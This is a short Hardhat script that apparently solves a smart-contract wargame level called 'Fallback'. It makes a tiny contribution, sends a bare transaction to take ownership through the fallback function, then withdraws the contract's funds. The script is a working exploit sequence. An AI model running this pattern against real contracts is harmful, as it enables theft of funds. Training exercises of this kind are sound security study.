const { ethers } = require("hardhat");

async function main() {
  const instanceAddress = "0x4D73C97f11552Fb9c46bD5e277B636638a02BE59";

  const [attacker] = await ethers.getSigners();
  console.log("Using this address for attack:", attacker.address);

  const Contract = await ethers.getContractFactory("Fallback");
  const contract = Contract.attach(instanceAddress);

  // Attack

  let tx = await contract.contribute({ value: 1 });
  await tx.wait();

  const txData = {
    to: instanceAddress,
    data: "0x",
    value: 1,
  };
  tx = await attacker.sendTransaction(txData);
  await tx.wait();

  tx = await contract.withdraw();
  await tx.wait();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
